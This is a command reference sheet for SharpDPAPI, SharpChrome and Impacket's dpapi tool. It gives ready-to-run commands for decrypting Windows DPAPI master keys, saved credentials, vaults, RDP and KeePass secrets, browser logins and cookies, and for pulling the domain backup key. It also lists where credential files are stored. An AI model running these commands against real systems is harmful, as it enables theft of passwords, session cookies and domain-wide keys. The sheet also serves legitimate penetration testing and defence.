# SharpDPAPI / DPAPI — Command Reference

## SharpDPAPI User Commands

| Command | Purpose | Example |
|---------|---------|---------|
| `triage` | Auto-run credentials, vaults, rdg, certificates | `SharpDPAPI.exe triage /unprotect` |
| `masterkeys` | Decrypt user master keys (GUID:SHA1 output) | `SharpDPAPI.exe masterkeys /password:Pass` |
| `credentials` | Decrypt Credential Manager blobs | `SharpDPAPI.exe credentials /pvk:key.pvk` |
| `vaults` | Decrypt Credential Vault entries | `SharpDPAPI.exe vaults /pvk:key.pvk` |
| `rdg` | Decrypt RDCMan.settings RDP passwords | `SharpDPAPI.exe rdg /unprotect` |
| `keepass` | Decrypt KeePass DPAPI keys | `SharpDPAPI.exe keepass /unprotect` |
| `certificates` | Decrypt certificate private keys | `SharpDPAPI.exe certificates /unprotect /showall` |

## SharpDPAPI Machine Commands (require admin/SYSTEM)

| Command | Purpose |
|---------|---------|
| `machinemasterkeys` | Decrypt machine master keys (uses DPAPI_SYSTEM LSA secret) |
| `machinecredentials` | Decrypt machine credential blobs |
| `machinevaults` | Decrypt machine vault entries |
| `machinetriage` | Run all machine-scoped triage commands |

## SharpDPAPI Supporting Commands

| Command | Purpose | Example |
|---------|---------|---------|
| `backupkey` | Retrieve domain DPAPI backup key (.pvk) via MS-BKRP | `SharpDPAPI.exe backupkey /server:dc01 /file:key.pvk` |

## Common Flags

| Flag | Meaning |
|------|---------|
| `/unprotect` | Use live `CryptUnprotectData` in current user context (online) |
| `/password:<pw>` | Decrypt master keys with the user's plaintext password |
| `/ntlm:<hash>` | Decrypt master keys with the user's NTLM hash |
| `/pvk:<file>` | Use domain backup private key for decryption |
| `/mkfile:<file>` | Provide a specific master key file |
| `/server:<dc>` | Target DC for backupkey retrieval |
| `/target:<path>` | Target file/folder to decrypt |
| `/rpc` | Use RPC to request master key decryption from a DC |
| `/showall` | Show all certificate stores / verbose output |

## SharpChrome Commands

| Command | Purpose | Example |
|---------|---------|---------|
| `logins` | Decrypt saved browser logins | `SharpChrome.exe logins /unprotect` |
| `cookies` | Decrypt browser cookies | `SharpChrome.exe cookies /pvk:key.pvk` |
| `statekeys` | Decrypt the AES app-bound state key | `SharpChrome.exe statekeys /unprotect` |

## Impacket dpapi.py (Linux)

| Subcommand | Purpose | Example |
|------------|---------|---------|
| `masterkey` | Decrypt a master key file | `impacket-dpapi masterkey -file MK -pvk key.pvk` |
| `credential` | Decrypt a credential blob | `impacket-dpapi credential -file CRED -key 0x<mk>` |
| `vault` | Decrypt vault policy/creds | `impacket-dpapi vault -vpol VPOL -vcrd VCRD -key 0x<mk>` |
| `backupkeys` | Retrieve domain backup keys | `impacket-dpapi backupkeys -t corp.local/admin@dc -pvk out.pvk` |

## Key File Locations

| Path | Contents |
|------|----------|
| `%APPDATA%\Microsoft\Protect\<SID>\` | User master keys |
| `%WINDIR%\System32\Microsoft\Protect\` | Machine master keys |
| `%LOCALAPPDATA%\Microsoft\Credentials\` | Credential Manager blobs |
| `%APPDATA%\Microsoft\Vault\` / `%LOCALAPPDATA%\Microsoft\Vault\` | Credential Vault |

## External References

- SharpDPAPI README: https://github.com/GhostPack/SharpDPAPI
- Impacket: https://github.com/fortra/impacket
